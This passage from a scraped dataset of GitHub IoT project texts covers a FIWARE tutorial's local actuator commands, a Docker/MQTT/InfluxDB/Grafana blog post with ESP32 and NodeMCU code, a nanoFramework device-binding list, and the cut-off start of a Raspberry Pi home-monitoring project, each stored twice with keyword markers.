context broker commands\nhaving connected up the iot agent to the iot devices, the orion context broker was informed that the commands now are available. in other words the iot agent registered itself as a context provider for the command attributes.\nonce the commands have been registered it will be possible to ring the bell, open and close the smart door and switch the smart lamp on and off by sending requests to the orion context broker, rather than sending ultralight 2.0 requests directly the iot devices as we did in the previous tutorial\nall the communications leaving and arriving at the north port of the iot agent use the standard ngsi syntax. the transport protocol used between the iot devices and the iot agent is irrelevant to this layer of communication. effectively the iot agent is offering a simplified facade pattern of well-known endpoints to actuate any device.\ntherefore this section of registering and invoking commands duplicates the instructions found in the previous tutorial\nringing the bell\nto invoke the ring command, the ring attribute must be updated in the context.\n1\ufe0f\u20e32\ufe0f\u20e3 request:\ncurl -ix patch \\\n'http://localhost:1026/v2/entities/urn:ngsi-ld:bell:001/attrs' \\\n-h 'content-type: application/json' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /' \\\n-d '{\n\"ring\": {\n\"type\" : \"command\",\n\"value\" : \"\"\n}\n}'\nif you are viewing the device monitor page, you can also see the state of the bell change.\nopening the smart door\nto invoke the open command, the open attribute must be updated in the context.\n1\ufe0f\u20e33\ufe0f\u20e3 request:\ncurl -ix patch \\\n'http://localhost:1026/v2/entities/urn:ngsi-ld:door:001/attrs' \\\n-h 'content-type: application/json' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /' \\\n-d '{\n\"open\": {\n\"type\" : \"command\",\n\"value\" : \"\"\n}\n}'\nswitching on the smart lamp\nto switch on the smart lamp, the on attribute must be updated in the context.\n1\ufe0f\u20e34\ufe0f\u20e3 request:\ncurl -ix patch \\\n'http://localhost:1026/v2/entities/urn:ngsi-ld:lamp:001/attrs' \\\n-h 'content-type: application/json' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /' \\\n-d '{\n\"on\": {\n\"type\" : \"command\",\n\"value\" : \"\"\n}\n}'\nnext steps\nwant to learn how to add more complexity to your application by adding advanced features? you can find out by reading the other tutorials in this series\nlicense\nmit \u00a9 2018-2020 fiware foundation e.v.\nfootnotes\nwikipedia: mqtt - a central communication point (known as the mqtt broker) which is in charge of dispatching all messages between services", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000790, "year": null}, {"Unnamed: 0": 798, "autor": 798, "date": null, "content": "Playing with Docker, MQTT, Grafana, InfluxDB, Python and Arduino\nI must admit this post is just an excuse to play with Grafana and InfluxDb. InfluxDB is a cool database especially designed to work with time series. And Grafana is one open source tool for time series analytics. I want to build a simple prototype. The idea is:\nOne Arduino device (esp32) emits a MQTT event to a mosquito server. I'll use a potentiometer to emulate one sensor (Imagine for example a temperature sensor instead of potentiometer)\nOne Python script will be listening to the MQTT event in my Raspberry Pi and it will persist the value to InfluxDB\nI will monitor the state of the time series given by the potentiometer with Grafana\nI will create an alert in Grafana (for example when the average value within 10 seconds is above a threshold) and I will trigger a webhook when the alert changes its state\nOne microservice (a Python flash server) will be listening to the webhook and it will emit a MQTT event depending on the state\nAnother Arduino device (one nodemcu) will be listening to this MQTT event and it will activate a led. Red one if the alert is on and green one if the alert is red\nServer\nAs I said before we'll need three servers:\nMQTT server (mosquitto)\nInfluxDB server\nGrafana server\nWe'll use Docker. I've got a Docker host running in a Raspberry Pi3. The Raspberry Pi is a ARM device so we need docker images for this architecture.\nversion: '2'\nservices:\nmosquitto:\nimage: pascaldevink/rpi-mosquitto\ncontainer_name: moquitto\nports:\n- \"9001:9001\"\n- \"1883:1883\"\nrestart: always\ninfluxdb:\nimage: hypriot/rpi-influxdb\ncontainer_name: influxdb\nrestart: always\nenvironment:\n- INFLUXDB_INIT_PWD=\"password\"\n- PRE_CREATE_DB=\"iot\"\nports:\n- \"8083:8083\"\n- \"8086:8086\"\nvolumes:\n- ~/docker/rpi-influxdb/data:/data\ngrafana:\nimage: fg2it/grafana-armhf:v4.6.3\ncontainer_name: grafana\nrestart: always\nports:\n- \"3000:3000\"\nvolumes:\n- grafana-db:/var/lib/grafana\n- grafana-log:/var/log/grafana\n- grafana-conf:/etc/grafana\nvolumes:\ngrafana-db:\ndriver: local\ngrafana-log:\ndriver: local\ngrafana-conf:\ndriver: local\nESP32\nThe Esp32 part is very simple. We only need to connect our potentiometer to the Esp32. The potentiometer has three pins: Gnd, Signal and Vcc. We'll use the pin 32. We only need to configure our Wifi network and connect to our MQTT server.\n#include <PubSubClient.h>\n#include <WiFi.h>\nconst int potentiometerPin = 32;\n// Wifi configuration\nconst char* ssid = \"my_wifi_ssid\";\nconst char* password = \"my_wifi_password\";\n// MQTT configuration\nconst char* server = \"192.168.1.111\";\nconst char* topic = \"/pot\";\nconst char* clientName = \"com.gonzalo123.esp32\";\nString payload;\nWiFiClient wifiClient;\nPubSubClient client(wifiClient);\nvoid wifiConnect() {\nSerial.println();\nSerial.print(\"Connecting to \");\nSerial.println(ssid);\nWiFi.begin(ssid, password);\nwhile (WiFi.status() != WL_CONNECTED) {\ndelay(500);\nSerial.print(\".\");\n}\nSerial.println(\"\");\nSerial.print(\"WiFi connected.\");\nSerial.print(\"IP address: \");\nSerial.println(WiFi.localIP());\n}\nvoid mqttReConnect() {\nwhile (!client.connected()) {\nSerial.print(\"Attempting MQTT connection...\");\nif (client.connect(clientName)) {\nSerial.println(\"connected\");\n} else {\nSerial.print(\"failed, rc=\");\nSerial.print(client.state());\nSerial.println(\" try again in 5 seconds\");\ndelay(5000);\n}\n}\n}\nvoid mqttEmit(String topic, String value)\n{\nclient.publish((char*) topic.c_str(), (char*) value.c_str());\n}\nvoid setup() {\nSerial.begin(115200);\nwifiConnect();\nclient.setServer(server, 1883);\ndelay(1500);\n}\nvoid loop() {\nif (!client.connected()) {\nmqttReConnect();\n}\nint current = (int) ((analogRead(potentiometerPin) * 100) / 4095);\nmqttEmit(topic, (String) current);\ndelay(500);\n}\nMqtt listener\nThe esp32 emits an event (\"/pot\") with the value of the potentiometer. So we're going to create a MQTT listener that listen to mqtt and persits the value to InfluxDB\nimport paho.mqtt.client as mqtt\nfrom influxdb import InfluxDBClient\nimport datetime\nimport logging\ndef persists(msg):\ncurrent_time = datetime.datetime.utcnow().isoformat()\njson_body = [\n{\n\"measurement\": \"pot\",\n\"tags\": {},\n\"time\": current_time,\n\"fields\": {\n\"value\": int(msg.payload)\n}\n}\n]\nlogging.info(json_body)\ninflux_client.write_points(json_body)\nlogging.basicConfig(level=logging.INFO)\ninflux_client = InfluxDBClient('docker', 8086, database='iot')\nclient = mqtt.Client()\nclient.on_connect = lambda self, mosq, obj, rc: self.subscribe(\"/pot\")\nclient.on_message = lambda client, userdata, msg: persists(msg)\nclient.connect(\"docker\", 1883, 60)\nclient.loop_forever()\nGrafana\nIn grafana we need to do two things. First create one datasource from our InfluxDB server. It's pretty straightforward to it. Finally we'll create a dashboard. We only have one time-serie with the value of the potentiometer. I must admit that my dasboard has a lot things that I've created only for fun. Thats the query that I'm using to plot the main graph\nSELECT last(\"value\") FROM \"pot\" WHERE time >= now() - 5m GROUP BY time(1s) fill(previous)\nHere we can see the dashboard\nAnd here my alert configuration:\nI've also created a notification channel with a webhook. Grafana will use this web hook to notify when the state of alert changes\nWebhook listener\nGrafana will emit a webhook, so we'll need an REST endpoint to collect the webhook calls. I normally use PHP/Lumen to create REST servers but in this project I'll use Python and Flask. We need to handle HTTP Basic Auth and emmit a MQTT event. Mqtt is a very simple protocol but it has one very nice feature that fits like hat fits like a glove here. Le me explain it: Imagine that we've got our system up and running and the state is \"ok\". Now we connect one device (for example one big red/green lights). Since the \"ok\" event was fired before we connect the lights, our green light will not be switch on. We need to wait util \"alert\" event if we want to see any light. That's not cool. Mqtt allows us to \"retain\" messages. That means that we can emit messages with \"retain\" flag to one topic and when we connect one device later to this topic it will receive the message. Here it's exactly what we need.\nfrom flask import Flask\nfrom flask import request\nfrom flask_httpauth import HTTPBasicAuth\nimport paho.mqtt.client as mqtt\nimport json\nclient = mqtt.Client()\napp = Flask(__name__)\nauth = HTTPBasicAuth()\n# http basic auth credentials\nusers = {\n\"user\": \"password\"\n}\n@auth.get_password\ndef get_pw(username):\nif username in users:\nreturn users.get(username)\nreturn None\n@app.route('/alert', methods=['POST'])\n@auth.login_required\ndef alert():\nclient.connect(\"docker\", 1883, 60)\ndata = json.loads(request.data.decode('utf-8'))\nif data['state'] == 'alerting':\nclient.publish(topic=\"/alert\", payload=\"1\", retain=True)\nelif data['state'] == 'ok':\nclient.publish(topic=\"/alert\", payload=\"0\", retain=True)\nclient.disconnect()\nreturn \"ok\"\nif __name__ == \"__main__\":\napp.run(host='0.0.0.0')\nNodemcu\nFinally the Nodemcu. This part is similar than the esp32 one. Our leds are in pins 4 and 5. We also need to configure the Wifi and connect to to MQTT server. Nodemcu and esp32 are similar devices but not the same. For example we need to use different libraries to connect to the wifi. This device will be listening to the MQTT event and trigger on led or another depending on the state\n#include <PubSubClient.h>\n#include <ESP8266WiFi.h>\nconst int ledRed = 4;\nconst int ledGreen = 5;\n// Wifi configuration\nconst char* ssid = \"my_wifi_ssid\";\nconst char* password = \"my_wifi_password\";\n// mqtt configuration\nconst char* server = \"192.168.1.111\";\nconst char* topic = \"/alert\";\nconst char* clientName = \"com.gonzalo123.nodemcu\";\nint value;\nint percent;\nString payload;\nWiFiClient wifiClient;\nPubSubClient client(wifiClient);\nvoid wifiConnect() {\nSerial.println();\nSerial.print(\"Connecting to \");\nSerial.println(ssid);\nWiFi.begin(ssid, password);\nwhile (WiFi.status() != WL_CONNECTED) {\ndelay(500);\nSerial.print(\".\");\n}\nSerial.println(\"\");\nSerial.print(\"WiFi connected.\");\nSerial.print(\"IP address: \");\nSerial.println(WiFi.localIP());\n}\nvoid mqttReConnect() {\nwhile (!client.connected()) {\nSerial.print(\"Attempting MQTT connection...\");\nif (client.connect(clientName)) {\nSerial.println(\"connected\");\nclient.subscribe(topic);\n} else {\nSerial.print(\"failed, rc=\");\nSerial.print(client.state());\nSerial.println(\" try again in 5 seconds\");\ndelay(5000);\n}\n}\n}\nvoid callback(char* topic, byte* payload, unsigned int length) {\nSerial.print(\"Message arrived [\");\nSerial.print(topic);\nString data;\nfor (int i = 0; i < length; i++) {\ndata += (char)payload[i];\n}\ncleanLeds();\nint value = data.toInt();\nswitch (value) {\ncase 1:\ndigitalWrite(ledRed, HIGH);\nbreak;\ncase 0:\ndigitalWrite(ledGreen, HIGH);\nbreak;\n}\nSerial.print(\"] value:\");\nSerial.println((int) value);\n}\nvoid cleanLeds() {\ndigitalWrite(ledRed, LOW);\ndigitalWrite(ledGreen, LOW);\n}\nvoid setup() {\nSerial.begin(9600);\npinMode(ledRed, OUTPUT);\npinMode(ledGreen, OUTPUT);\ncleanLeds();\nSerial.println(\"start\");\nwifiConnect();\nclient.setServer(server, 1883);\nclient.setCallback(callback);\ndelay(1500);\n}\nvoid loop() {\nSerial.print(\".\");\nif (!client.connected()) {\nmqttReConnect();\n}\nclient.loop();\ndelay(500);\n}", "link": "https://github.com/gonzalo123/iot.grafana", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "playing with docker, mqtt, grafana, influxdb, python and arduino\ni must admit this post is just an excuse to play with grafana and influxdb. influxdb is a cool database especially designed to work with time series. and grafana is one open source -----> tool !!!  for time series analytics. i want to build a simple prototype. the idea is:\none arduino device (esp32) emits a mqtt event to a mosquito server. i'll use a potentiometer to emulate one sensor (imagine for example a temperature sensor instead of potentiometer)\none python script will be listening to the mqtt event in my raspberry pi and it will persist the value to influxdb\ni will monitor the state of the time series given by the potentiometer with grafana\ni will create an alert in grafana (for example when the average value within 10 seconds is above a threshold) and i will trigger a webhook when the alert changes its state\none microservice (a python flash server) will be listening to the webhook and it will emit a mqtt event depending on the state\nanother arduino device (one nodemcu) will be listening to this mqtt event and it will activate a led. red one if the alert is on and green one if the alert is red\nserver\nas i said before we'll need three servers:\nmqtt server (mosquitto)\ninfluxdb server\ngrafana server\nwe'll use docker. i've got a docker host running in a raspberry pi3. the raspberry pi is a arm device so we need docker images for this architecture.\nversion: '2'\nservices:\nmosquitto:\nimage: pascaldevink/rpi-mosquitto\ncontainer_name: moquitto\nports:\n- \"9001:9001\"\n- \"1883:1883\"\nrestart: always\ninfluxdb:\nimage: hypriot/rpi-influxdb\ncontainer_name: influxdb\nrestart: always\nenvironment:\n- influxdb_init_pwd=\"password\"\n- pre_create_db=\"iot\"\nports:\n- \"8083:8083\"\n- \"8086:8086\"\nvolumes:\n- ~/docker/rpi-influxdb/data:/data\ngrafana:\nimage: fg2it/grafana-armhf:v4.6.3\ncontainer_name: grafana\nrestart: always\nports:\n- \"3000:3000\"\nvolumes:\n- grafana-db:/var/lib/grafana\n- grafana-log:/var/log/grafana\n- grafana-conf:/etc/grafana\nvolumes:\ngrafana-db:\ndriver: local\ngrafana-log:\ndriver: local\ngrafana-conf:\ndriver: local\nesp32\nthe esp32 part is very simple. we only need to connect our potentiometer to the esp32. the potentiometer has three pins: gnd, signal and vcc. we'll use the pin 32. we only need to configure our wifi network and connect to our mqtt server.\n#include <pubsubclient.h>\n#include <wifi.h>\nconst int potentiometerpin = 32;\n// wifi configuration\nconst char* ssid = \"my_wifi_ssid\";\nconst char* password = \"my_wifi_password\";\n// mqtt configuration\nconst char* server = \"192.168.1.111\";\nconst char* topic = \"/pot\";\nconst char* clientname = \"com.gonzalo123.esp32\";\nstring payload;\nwificlient wificlient;\npubsubclient client(wificlient);\nvoid wificonnect() {\nserial.println();\nserial.print(\"connecting to \");\nserial.println(ssid);\nwifi.begin(ssid, password);\nwhile (wifi.status() != wl_connected) {\ndelay(500);\nserial.print(\".\");\n}\nserial.println(\"\");\nserial.print(\"wifi connected.\");\nserial.print(\"ip address: \");\nserial.println(wifi.localip());\n}\nvoid mqttreconnect() {\nwhile (!client.connected()) {\nserial.print(\"attempting mqtt connection...\");\nif (client.connect(clientname)) {\nserial.println(\"connected\");\n} else {\nserial.print(\"failed, rc=\");\nserial.print(client.state());\nserial.println(\" try again in 5 seconds\");\ndelay(5000);\n}\n}\n}\nvoid mqttemit(string topic, string value)\n{\nclient.publish((char*) topic.c_str(), (char*) value.c_str());\n}\nvoid setup() {\nserial.begin(115200);\nwificonnect();\nclient.setserver(server, 1883);\ndelay(1500);\n}\nvoid loop() {\nif (!client.connected()) {\nmqttreconnect();\n}\nint current = (int) ((analogread(potentiometerpin) * 100) / 4095);\nmqttemit(topic, (string) current);\ndelay(500);\n}\nmqtt listener\nthe esp32 emits an event (\"/pot\") with the value of the potentiometer. so we're going to create a mqtt listener that listen to mqtt and persits the value to influxdb\nimport paho.mqtt.client as mqtt\nfrom influxdb import influxdbclient\nimport datetime\nimport logging\ndef persists(msg):\ncurrent_time = datetime.datetime.utcnow().isoformat()\njson_body = [\n{\n\"measurement\": \"pot\",\n\"tags\": {},\n\"time\": current_time,\n\"fields\": {\n\"value\": int(msg.payload)\n}\n}\n]\nlogging.info(json_body)\ninflux_client.write_points(json_body)\nlogging.basicconfig(level=logging.info)\ninflux_client = influxdbclient('docker', 8086, database='iot')\nclient = mqtt.client()\nclient.on_connect = lambda self, mosq, obj, rc: self.subscribe(\"/pot\")\nclient.on_message = lambda client, userdata, msg: persists(msg)\nclient.connect(\"docker\", 1883, 60)\nclient.loop_forever()\ngrafana\nin grafana we need to do two things. first create one datasource from our influxdb server. it's pretty straightforward to it. finally we'll create a dashboard. we only have one time-serie with the value of the potentiometer. i must admit that my dasboard has a lot things that i've created only for fun. thats the query that i'm using to plot the main graph\nselect last(\"value\") from \"pot\" where time >= now() - 5m group by time(1s) fill(previous)\nhere we can see the dashboard\nand here my alert configuration:\ni've also created a notification channel with a webhook. grafana will use this web hook to notify when the state of alert changes\nwebhook listener\ngrafana will emit a webhook, so we'll need an rest endpoint to collect the webhook calls. i normally use php/lumen to create rest servers but in this project i'll use python and flask. we need to handle http basic auth and emmit a mqtt event. mqtt is a very simple protocol but it has one very nice feature that fits like hat fits like a glove here. le me explain it: imagine that we've got our system up and running and the state is \"ok\". now we connect one device (for example one big red/green lights). since the \"ok\" event was fired before we connect the lights, our green light will not be switch on. we need to wait util \"alert\" event if we want to see any light. that's not cool. mqtt allows us to \"retain\" messages. that means that we can emit messages with \"retain\" flag to one topic and when we connect one device later to this topic it will receive the message. here it's exactly what we need.\nfrom flask import flask\nfrom flask import request\nfrom flask_httpauth import httpbasicauth\nimport paho.mqtt.client as mqtt\nimport json\nclient = mqtt.client()\napp = flask(__name__)\nauth = httpbasicauth()\n# http basic auth credentials\nusers = {\n\"user\": \"password\"\n}\n@auth.get_password\ndef get_pw(username):\nif username in users:\nreturn users.get(username)\nreturn none\n@app.route('/alert', methods=['post'])\n@auth.login_required\ndef alert():\nclient.connect(\"docker\", 1883, 60)\ndata = json.loads(request.data.decode('utf-8'))\nif data['state'] == 'alerting':\nclient.publish(topic=\"/alert\", payload=\"1\", retain=true)\nelif data['state'] == 'ok':\nclient.publish(topic=\"/alert\", payload=\"0\", retain=true)\nclient.disconnect()\nreturn \"ok\"\nif __name__ == \"__main__\":\napp.run(host='0.0.0.0')\nnodemcu\nfinally the nodemcu. this part is similar than the esp32 one. our leds are in pins 4 and 5. we also need to configure the wifi and connect to to mqtt server. nodemcu and esp32 are similar devices but not the same. for example we need to use different libraries to connect to the wifi. this device will be listening to the mqtt event and trigger on led or another depending on the state\n#include <pubsubclient.h>\n#include <esp8266wifi.h>\nconst int ledred = 4;\nconst int ledgreen = 5;\n// wifi configuration\nconst char* ssid = \"my_wifi_ssid\";\nconst char* password = \"my_wifi_password\";\n// mqtt configuration\nconst char* server = \"192.168.1.111\";\nconst char* topic = \"/alert\";\nconst char* clientname = \"com.gonzalo123.nodemcu\";\nint value;\nint percent;\nstring payload;\nwificlient wificlient;\npubsubclient client(wificlient);\nvoid wificonnect() {\nserial.println();\nserial.print(\"connecting to \");\nserial.println(ssid);\nwifi.begin(ssid, password);\nwhile (wifi.status() != wl_connected) {\ndelay(500);\nserial.print(\".\");\n}\nserial.println(\"\");\nserial.print(\"wifi connected.\");\nserial.print(\"ip address: \");\nserial.println(wifi.localip());\n}\nvoid mqttreconnect() {\nwhile (!client.connected()) {\nserial.print(\"attempting mqtt connection...\");\nif (client.connect(clientname)) {\nserial.println(\"connected\");\nclient.subscribe(topic);\n} else {\nserial.print(\"failed, rc=\");\nserial.print(client.state());\nserial.println(\" try again in 5 seconds\");\ndelay(5000);\n}\n}\n}\nvoid callback(char* topic, byte* payload, unsigned int length) {\nserial.print(\"message arrived [\");\nserial.print(topic);\nstring data;\nfor (int i = 0; i < length; i++) {\ndata += (char)payload[i];\n}\ncleanleds();\nint value = data.toint();\nswitch (value) {\ncase 1:\ndigitalwrite(ledred, high);\nbreak;\ncase 0:\ndigitalwrite(ledgreen, high);\nbreak;\n}\nserial.print(\"] value:\");\nserial.println((int) value);\n}\nvoid cleanleds() {\ndigitalwrite(ledred, low);\ndigitalwrite(ledgreen, low);\n}\nvoid setup() {\nserial.begin(9600);\npinmode(ledred, output);\npinmode(ledgreen, output);\ncleanleds();\nserial.println(\"start\");\nwificonnect();\nclient.setserver(server, 1883);\nclient.setcallback(callback);\ndelay(1500);\n}\nvoid loop() {\nserial.print(\".\");\nif (!client.connected()) {\nmqttreconnect();\n}\nclient.loop();\ndelay(500);\n}", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000798, "year": null}, {"Unnamed: 0": 809, "autor": 809, "date": null, "content": "Welcome to the nanoFramework IoT.Device Library repository!\nThis repository contains bindings which can be sensors, small screen and anything else that you can connect to your nanoFramework chip!\nMost of the bindings have been migrated from .NET IoT repository. Not all the bindings make sense to migrate to .NET nanoFramework, so the effort of migration has been placed into devices that can work with .NET nanoFramework. Please note as well that some devices have been migrated without been tested, so they main contain problems.\nList of devices\n28BYJ-48 Stepper Motor 5V 4-Phase 5-Wire & ULN2003 Driver Board\nAD5328 - Digital to Analog Convertor\nADS1115 - Analog to Digital Converter\nADXL345 - Accelerometer\nADXL357 - Accelerometer\nAGS01DB - MEMS VOC Gas Sensor\nAHT10/15/20 - Temperature and humidity sensor modules\nAK8963 - Magnetometer\nAMG88xx Infrared Array Sensor Family\nAPA102 - Double line transmission integrated control LED\nAT24C128C - I2C EEPROM read/write\nAXP192 - Enhanced single Cell Li-Battery and Power System Management IC\nBh1745 - RGB Sensor\nBH1750FVI - Ambient Light Sensor\nBmm150 - Magnetometer\nBMP180 - barometer, altitude and temperature sensor\nBMxx80 Device Family\nBNO055 - inertial measurement unit\nButton\nBuzzer - Piezo Buzzer Controller\nCCS811 Gas sensor\nCharlieplex Segment binding\nDC Motor Controller\nDHTxx - Digital-Output Relative Humidity & Temperature Sensor Module\nDigital liquid level switch\nGeneric shift register\nHC-SR04 - Ultrasonic Ranging Module\nHC-SR04 - Ultrasonic Ranging Module for ESP32 with RMT\nHC-SR501 - PIR Motion Sensor\nHMC5883L - 3 Axis Digital Compass\nHTS221 - Capacitive digital sensor for relative humidity and temperature\nIot.Device.Multiplexing\nIot.Device.NumberHelper\nIot.Device.WeatherHelper\nIP5306 - Power management\nKey Matrix\nLidarLiteV3 - LIDAR Time of Flight Sensor\nLM75 - Digital Temperature Sensor\nLPS25H - Piezoresistive pressure and thermometer sensor\nLSM9DS1 - 3D accelerometer, gyroscope and magnetometer\nMax31856 - cold-junction compensated thermocouple to digital converter\nMAX31865 - Resistance Temperature Detector Amplifier\nMAX44009 - Ambient Light Sensor\nMax7219 (LED Matrix driver)\nMBI5027 -- 16-bit shift register with error detection\nMcp25xxx device family - CAN bus\nMcp3428 - Analog to Digital Converter (I2C)\nMCP3xxx family of Analog to Digital Converters\nMCP9808 - Digital Temperature Sensor\nMFRC522 - RFID reader\nMLX90614 - Infra Red Thermometer\nMPR121 - Proximity Capacitive Touch Sensor Controller\nMPU6500/MPU9250 - Gyroscope, Accelerometer, Temperature and Magnetometer (MPU9250 only)\nMpu6886 - accelerometer and gyroscope\nnRF24L01 - Single Chip 2.4 GHz Transceiver\nPca95x4 - I2C GPIO Expander\nPN5180 - RFID and NFC reader\nPN532 - RFID and NFC reader\nQuadrature Rotary Encoder\nRadio Receiver\nRadio Transmitter\nRealtime Clock\nRFID shared elements\nServo Motor\nSHT3x - Temperature & Humidity Sensor\nSHTC3 - Temperature & Humidity Sensor\nSi7021 - Temperature & Humidity Sensor\nSN74HC595 -- 8-bit shift register\nSSD13xx & SSH1106 OLED display family\nSystem.Buffers.Binary.BinaryPrimitives\nSystem.Device.Model - attributes for device bindings\nSystem.Diagnostics.Stopwatch and DelayHelper\nSystem.Drawing\nSystem.Numerics\nTCS3472x Sensors\nTM1637 - Segment Display\nTSL256x - Illuminance sensor\nVL53L0X - distance sensor\nWs28xx LED drivers\nYX5200/YX5300 - MP3 Player\nFolder Structure\n/src/devices/ contains devices that were cleaned up and should be working out of the box.\n/src/devices_generated/ contains devices that were automatically ported from the NET Core IoT Libraries devices. They might not work or compile at this point, but are a good starting point if you need support for one of the devices contained here but missing from the /src/devices/ folder.\n/src/nanoFramework.IoT.Device.CodeConverter contains the tool used to generate the devices from the NET Core IoT Libraries devices.\nOther folders in /src contain nanoFramework projects that you can reference when creating/updating devices with provide functionality such as a StopWatach, a DelayHelper, BinaryPrimitives or various System.Device.Model Attributes.\nContributing\nImportant: If you plan to clean up the code in /src/devices_generated/, please copy your work to the /src/devices/ folder as the content of /src/devices_generated/ will be overwritten by the generator tool.\nPlease check the detail list of tips and tricks to facilitate the migration. The generator takes care of some heavy lifting but there is always some manual adjustments needed.\nWe are using the following structure for the bindings:\n/devices\n/Binding1\n/samples\nBinding1.Samples.nfproj\nAssicateFile.cs\nProgram.cs\n/test\nBindingA.Test.nfproj\nAssociatedTestFile.cs\nBinding1.nfproj\nBinding1.nuspec\nversion.json\nOtherFiles.cs\nOtherFiles.anythingelse\nReadme.md\nUsing the Code Converter\nThe Code Converter allows to facilitate migration of .NET Core/.NET 5.0 code into .NET nanoFramework. More information and how to customize and run it here.\nPorting a .NET nanoFramework binding to .NET IoT\nDid you know that with minimal efforts you can make a nanoFramework binding available for .NET IoT as well? More information and guidance on the steps to take, can be found in this article.\nFeedback and documentation\nFor documentation, providing feedback, issues and finding out how to contribute please refer to the Home repo.\nJoin our Discord community here.\nCredits\nThe list of contributors to this project can be found at CONTRIBUTORS.\nLicense\nThe nanoFramework Class Libraries are licensed under the MIT license.\nCode of Conduct\nThis project has adopted the code of conduct defined by the Contributor Covenant to clarify expected behavior in our community. For more information see the .NET Foundation Code of Conduct.\n.NET Foundation\nThis project is supported by the .NET Foundation.", "link": "https://github.com/nanoframework/nanoFramework.IoT.Device", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "welcome to the nanoframework iot.device library repository!\nthis repository contains bindings which can be sensors, small screen and anything else that you can connect to your nanoframework chip!\nmost of the bindings have been migrated from .net iot repository. not all the bindings make sense to migrate to .net nanoframework, so the effort of migration has been placed into devices that can work with .net nanoframework. please note as well that some devices have been migrated without been tested, so they main contain problems.\nlist of devices\n28byj-48 stepper motor 5v 4-phase 5-wire & uln2003 driver board\nad5328 - digital to analog convertor\nads1115 - analog to digital converter\nadxl345 - accelerometer\nadxl357 - accelerometer\nags01db - mems voc gas sensor\naht10/15/20 - temperature and humidity sensor modules\nak8963 - magnetometer\namg88xx infrared array sensor family\napa102 - double line transmission integrated control led\nat24c128c - i2c eeprom read/write\naxp192 - enhanced single cell li-battery and power system management ic\nbh1745 - rgb sensor\nbh1750fvi - ambient light sensor\nbmm150 - magnetometer\nbmp180 - barometer, altitude and temperature sensor\nbmxx80 device family\nbno055 - inertial measurement unit\nbutton\nbuzzer - piezo buzzer controller\nccs811 gas sensor\ncharlieplex segment binding\ndc motor controller\ndhtxx - digital-output relative humidity & temperature sensor module\ndigital liquid level switch\ngeneric shift register\nhc-sr04 - ultrasonic ranging module\nhc-sr04 - ultrasonic ranging module for esp32 with rmt\nhc-sr501 - pir motion sensor\nhmc5883l - 3 axis digital compass\nhts221 - capacitive digital sensor for relative humidity and temperature\niot.device.multiplexing\niot.device.numberhelper\niot.device.weatherhelper\nip5306 - power management\nkey matrix\nlidarlitev3 - lidar time of flight sensor\nlm75 - digital temperature sensor\nlps25h - piezoresistive pressure and thermometer sensor\nlsm9ds1 - 3d accelerometer, gyroscope and magnetometer\nmax31856 - cold-junction compensated thermocouple to digital converter\nmax31865 - resistance temperature detector amplifier\nmax44009 - ambient light sensor\nmax7219 (led matrix driver)\nmbi5027 -- 16-bit shift register with error detection\nmcp25xxx device family - can bus\nmcp3428 - analog to digital converter (i2c)\nmcp3xxx family of analog to digital converters\nmcp9808 - digital temperature sensor\nmfrc522 - rfid reader\nmlx90614 - infra red thermometer\nmpr121 - proximity capacitive touch sensor controller\nmpu6500/mpu9250 - gyroscope, accelerometer, temperature and magnetometer (mpu9250 only)\nmpu6886 - accelerometer and gyroscope\nnrf24l01 - single chip 2.4 ghz transceiver\npca95x4 - i2c gpio expander\npn5180 - rfid and nfc reader\npn532 - rfid and nfc reader\nquadrature rotary encoder\nradio receiver\nradio transmitter\nrealtime clock\nrfid shared elements\nservo motor\nsht3x - temperature & humidity sensor\nshtc3 - temperature & humidity sensor\nsi7021 - temperature & humidity sensor\nsn74hc595 -- 8-bit shift register\nssd13xx & ssh1106 oled display family\nsystem.buffers.binary.binaryprimitives\nsystem.device.model - attributes for device bindings\nsystem.diagnostics.stopwatch and delayhelper\nsystem.drawing\nsystem.numerics\ntcs3472x sensors\ntm1637 - segment display\ntsl256x - illuminance sensor\nvl53l0x - distance sensor\nws28xx led drivers\nyx5200/yx5300 - mp3 player\nfolder structure\n/src/devices/ contains devices that were cleaned up and should be working out of the box.\n/src/devices_generated/ contains devices that were automatically ported from the net core iot libraries devices. they might not work or compile at this point, but are a good starting point if you need support for one of the devices contained here but missing from the /src/devices/ folder.\n/src/nanoframework.iot.device.codeconverter contains the -----> tool !!!  used to generate the devices from the net core iot libraries devices.\nother folders in /src contain nanoframework projects that you can reference when creating/updating devices with provide functionality such as a stopwatach, a delayhelper, binaryprimitives or various system.device.model attributes.\ncontributing\nimportant: if you plan to clean up the code in /src/devices_generated/, please copy your work to the /src/devices/ folder as the content of /src/devices_generated/ will be overwritten by the generator tool.\nplease check the detail list of tips and tricks to facilitate the migration. the generator takes care of some heavy lifting but there is always some manual adjustments needed.\nwe are using the following structure for the bindings:\n/devices\n/binding1\n/samples\nbinding1.samples.nfproj\nassicatefile.cs\nprogram.cs\n/test\nbindinga.test.nfproj\nassociatedtestfile.cs\nbinding1.nfproj\nbinding1.nuspec\nversion.json\notherfiles.cs\notherfiles.anythingelse\nreadme.md\nusing the code converter\nthe code converter allows to facilitate migration of .net core/.net 5.0 code into .net nanoframework. more information and how to customize and run it here.\nporting a .net nanoframework binding to .net iot\ndid you know that with minimal efforts you can make a nanoframework binding available for .net iot as well? more information and guidance on the steps to take, can be found in this article.\nfeedback and documentation\nfor documentation, providing feedback, issues and finding out how to contribute please refer to the home repo.\njoin our discord community here.\ncredits\nthe list of contributors to this project can be found at contributors.\nlicense\nthe nanoframework class libraries are licensed under the mit license.\ncode of conduct\nthis project has adopted the code of conduct defined by the contributor covenant to clarify expected behavior in our community. for more information see the .net foundation code of conduct.\n.net foundation\nthis project is supported by the .net foundation.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000809, "year": null}, {"Unnamed: 0": 812, "autor": 812, "date": null, "content": "Home Monitoring with Raspberry Pi and Node.js\nDescription\nThe project is designed as a end to end solution for a DIY Home Monitoring & Intruder Alert system. Besides offering a live video stream on any device (web responsive client), it also actively monitors for 